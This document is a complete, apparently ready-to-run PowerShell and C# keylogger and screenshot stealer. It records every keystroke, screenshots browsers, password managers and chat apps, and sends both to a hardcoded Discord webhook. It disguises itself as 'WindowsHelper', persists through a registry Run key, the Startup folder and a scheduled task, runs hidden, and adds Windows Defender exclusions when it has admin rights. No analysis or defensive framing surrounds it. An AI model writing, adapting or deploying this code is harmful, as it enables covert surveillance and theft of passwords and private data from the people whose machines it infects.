$ErrorActionPreference = 'SilentlyContinue'

# ======================= CONFIG =======================
$Webhook     = "https://discord.com/api/webhooks/1569542381072814221/6QObZS_5JMHMQOJ3y_Pog5PyLgiesDP-uaC802RQTSY5afaU20eZTa9CqcsNXjIbwZif"
# Foreground process names to screenshot. "*" = everything.
$ShotProcs   = @("chrome","msedge","firefox","brave","opera","vivaldi",
                 "keepassxc","1password","bitwarden","discord","slack","teams",
                 "code","excel","notepad")
$TitleRx     = ""      # optional regex on window title, "" = ignore
$ShotSec     = 30      # min seconds between screenshots
$KeySec      = 60      # seconds between keystroke batches
$Quality     = 55      # JPEG quality 1-100
$MaxWidth    = 1600    # downscale width, keeps files small
# ======================================================

$Dir    = "$env:APPDATA\Microsoft\WindowsHelper"
$Target = "$Dir\w.ps1"
$Vbs    = "$Dir\w.vbs"
$Log    = "$Dir\keys.log"
New-Item -ItemType Directory -Force -Path $Dir | Out-Null

# ---- single instance ----
$mtx = New-Object Threading.Mutex($false, "WinHelperAgent")
if (-not $mtx.WaitOne(0)) { exit }

# ---- self-copy ----
$Self = $MyInvocation.MyCommand.Path
if ($Self -and ($Self -ne $Target)) { Copy-Item $Self $Target -Force }

# ---- C# engine ----
$src = @'
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

public class Agent
{
    public static string Webhook = "", LogFile = "", TitleRx = "";
    public static string[] Procs = new string[0];
    public static int ShotSec = 30, KeySec = 60, Quality = 55, MaxWidth = 1600;

    static readonly object _lk = new object();
    static StringBuilder _buf = new StringBuilder();
    static DateTime _lastFlush = DateTime.Now, _lastShot = DateTime.MinValue;
    static IntPtr _hook = IntPtr.Zero;
    delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LowLevelProc cb, IntPtr hMod, uint tid);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vk);
    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] static extern int GetWindowThreadProcessId(IntPtr h, out uint pid);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint tid);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int ToUnicodeEx(uint vk, uint sc, byte[] st, StringBuilder sb, int n, uint fl, IntPtr lay);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] static extern IntPtr GetModuleHandle(string n);

    public static void Start()
    {
        Thread h = new Thread(HookThread); h.IsBackground = true; h.SetApartmentState(ApartmentState.STA); h.Start();
        Thread f = new Thread(FlushLoop);  f.IsBackground = true; f.Start();
        Thread s = new Thread(ShotLoop);   s.IsBackground = true; s.Start();
    }

    static void HookThread()
    {
        _hook = SetWindowsHookEx(13, new LowLevelProc(HookProc), GetModuleHandle(null), 0);
        Application.Run();
    }

    static string Translate(int vk, int sc)
    {
        byte[] st = new byte[256];
        if (GetAsyncKeyState(0x10) < 0 || GetAsyncKeyState(0xA0) < 0 || GetAsyncKeyState(0xA1) < 0) st[0x10] = 0x80;
        if (GetAsyncKeyState(0x12) < 0) st[0x12] = 0x80;
        if ((GetAsyncKeyState(0x14) & 1) != 0) st[0x14] = 0x01;
        StringBuilder sb = new StringBuilder(8);
        int r = ToUnicodeEx((uint)vk, (uint)sc, st, sb, 8, 0, GetKeyboardLayout(0));
        if (r != 0) return sb.ToString();
        return null;
    }

    static string Special(int vk)
    {
        switch (vk)
        {
            case 0x0D: return "\n";
            case 0x08: return "[BKSP]";
            case 0x09: return "[TAB]";
            case 0x1B: return "[ESC]";
            case 0x2E: return "[DEL]";
            case 0x25: return "[LEFT]"; case 0x26: return "[UP]";
            case 0x27: return "[RIGHT]"; case 0x28: return "[DOWN]";
            case 0x24: return "[HOME]"; case 0x23: return "[END]";
            case 0x11: return "[CTRL]"; case 0x12: return "[ALT]"; case 0x5B: return "[WIN]";
            case 0x2C: return "[PRTSC]";
        }
        if (vk >= 0x70 && vk <= 0x87) return "[F" + (vk - 0x6F) + "]";
        return null;
    }

    static IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
    {
        try
        {
            if (nCode >= 0 && (wParam == (IntPtr)0x100 || wParam == (IntPtr)0x104))
            {
                int vk = Marshal.ReadInt32(lParam);
                int sc = Marshal.ReadInt32(lParam, 4);
                string s = Translate(vk, sc);
                if (string.IsNullOrEmpty(s)) s = Special(vk);
                if (!string.IsNullOrEmpty(s)) lock (_lk) _buf.Append(s);
            }
        }
        catch { }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }

    static void FlushLoop()
    {
        while (true)
        {
            Thread.Sleep(1000);
            if ((DateTime.Now - _lastFlush).TotalSeconds < KeySec) continue;
            _lastFlush = DateTime.Now;
            string chunk;
            lock (_lk)
            {
                if (_buf.Length == 0) continue;
                chunk = _buf.ToString();
                _buf.Length = 0;
            }
            try { File.AppendAllText(LogFile, chunk); } catch { }
            string body = "**" + Environment.MachineName + "** `" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") +
                          "`\n```\n" + Cut(chunk, 1700) + "\n```";
            try { Post(body, "keys.txt", Encoding.UTF8.GetBytes(chunk), "text/plain"); } catch { }
        }
    }

    static bool Match(out string title)
    {
        title = "";
        IntPtr h = GetForegroundWindow();
        if (h == IntPtr.Zero) return false;
        uint pid; GetWindowThreadProcessId(h, out pid);
        string name;
        try { name = Process.GetProcessById((int)pid).ProcessName.ToLower(); } catch { return false; }
        StringBuilder sb = new StringBuilder(512);
        GetWindowText(h, sb, 512);
        title = sb.ToString();
        bool ok = false;
        foreach (string p in Procs)
            if (p == "*" || name.Contains(p.ToLower())) { ok = true; break; }
        if (!ok) return false;
        if (TitleRx != "" && !Regex.IsMatch(title, TitleRx, RegexOptions.IgnoreCase)) return false;
        return true;
    }

    static void ShotLoop()
    {
        while (true)
        {
            Thread.Sleep(1000);
            if ((DateTime.Now - _lastShot).TotalSeconds < ShotSec) continue;
            string title;
            if (!Match(out title)) continue;
            _lastShot = DateTime.Now;
            byte[] jpg;
            try { jpg = Grab(); } catch { continue; }
            if (jpg == null || jpg.Length == 0) continue;
            string body = "**Screenshot** `" + DateTime.Now.ToString("HH:mm:ss") + "`\n" + Cut(title, 200);
            try { Post(body, "shot_" + DateTime.Now.ToString("HHmmss") + ".jpg", jpg, "image/jpeg"); } catch { }
        }
    }

    static byte[] Grab()
    {
        Rectangle b = SystemInformation.VirtualScreen;
        Bitmap bmp = new Bitmap(b.Width, b.Height, PixelFormat.Format24bppRgb);
        using (Graphics g = Graphics.FromImage(bmp))
            g.CopyFromScreen(b.X, b.Y, 0, 0, b.Size, CopyPixelOperation.SourceCopy);
        if (bmp.Width > MaxWidth)
        {
            int nh = (int)(bmp.Height * ((double)MaxWidth / bmp.Width));
            Bitmap small = new Bitmap(bmp, MaxWidth, nh);
            bmp.Dispose(); bmp = small;
        }
        ImageCodecInfo codec = null;
        foreach (ImageCodecInfo c in ImageCodecInfo.GetImageEncoders())
            if (c.MimeType == "image/jpeg") codec = c;
        EncoderParameters ep = new EncoderParameters(1);
        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)Quality);
        MemoryStream ms = new MemoryStream();
        if (codec != null) bmp.Save(ms, codec, ep); else bmp.Save(ms, ImageFormat.Jpeg);
        bmp.Dispose();
        return ms.ToArray();
    }

    static string Cut(string s, int n) { return s.Length <= n ? s : s.Substring(0, n) + "..."; }

    static string Q(string s)
    {
        StringBuilder sb = new StringBuilder("\"");
        foreach (char c in s)
        {
            if (c == '"' || c == '\\') sb.Append('\\').Append(c);
            else if (c == '\n') sb.Append("\\n");
            else if (c == '\r') { }
            else if (c < 0x20) { }
            else sb.Append(c);
        }
        return sb.Append('"').ToString();
    }

    static void Post(string content, string fname, byte[] data, string mime)
    {
        string bnd = "----" + Guid.NewGuid().ToString("N");
        string json = "{\"content\":" + Q(content) + "}";
        MemoryStream ms = new MemoryStream();
        byte[] pre = Encoding.UTF8.GetBytes("--" + bnd + "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n\r\n" +
                     json + "\r\n--" + bnd + "\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"" +
                     fname + "\"\r\nContent-Type: " + mime + "\r\n\r\n");
        ms.Write(pre, 0, pre.Length);
        if (data != null && data.Length > 0) ms.Write(data, 0, data.Length);
        byte[] tail = Encoding.UTF8.GetBytes("\r\n--" + bnd + "--\r\n");
        ms.Write(tail, 0, tail.Length);
        byte[] all = ms.ToArray();

        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(Webhook);
        req.Method = "POST";
        req.ContentType = "multipart/form-data; boundary=" + bnd;
        req.Timeout = 30000; req.ReadWriteTimeout = 30000;
        req.ContentLength = all.Length;
        using (Stream s = req.GetRequestStream()) s.Write(all, 0, all.Length);
        try { using (HttpWebResponse r = (HttpWebResponse)req.GetResponse()) { } }
        catch (WebException we)
        {
            HttpWebResponse er = we.Response as HttpWebResponse;
            if (er != null && (int)er.StatusCode == 429) Thread.Sleep(5000);
        }
    }
}
'@

Add-Type -AssemblyName System.Windows.Forms, System.Drawing
Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp

[Agent]::Webhook  = $Webhook
[Agent]::LogFile  = $Log
[Agent]::Procs    = $ShotProcs
[Agent]::TitleRx  = $TitleRx
[Agent]::ShotSec  = $ShotSec
[Agent]::KeySec   = $KeySec
[Agent]::Quality  = $Quality
[Agent]::MaxWidth = $MaxWidth

# ---- persistence ----
$vbsBody = 'Set s = CreateObject("WScript.Shell")' + "`r`n" +
           's.Run "powershell -w hidden -ep bypass -f ""' + $Target + '""", 0, False'
Set-Content -Path $Vbs -Value $vbsBody -Encoding ASCII

Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
                 -Name 'WindowsHelper' -Value ('wscript.exe "' + $Vbs + '"')

$startup = [Environment]::GetFolderPath('Startup')
Copy-Item $Vbs (Join-Path $startup 'WindowsHelper.vbs') -Force

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
         ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($admin) {
    schtasks /create /tn "WindowsHelper" /f /sc onlogon /rl highest `
        /tr ('wscript.exe "' + $Vbs + '"') 2>&1 | Out-Null
    Add-MpPreference -ExclusionPath $Dir 2>&1 | Out-Null
    Add-MpPreference -ExclusionProcess "powershell.exe" 2>&1 | Out-Null
}

# ---- run ----
[Agent]::Start()
while ($true) { Start-Sleep -Seconds 60 }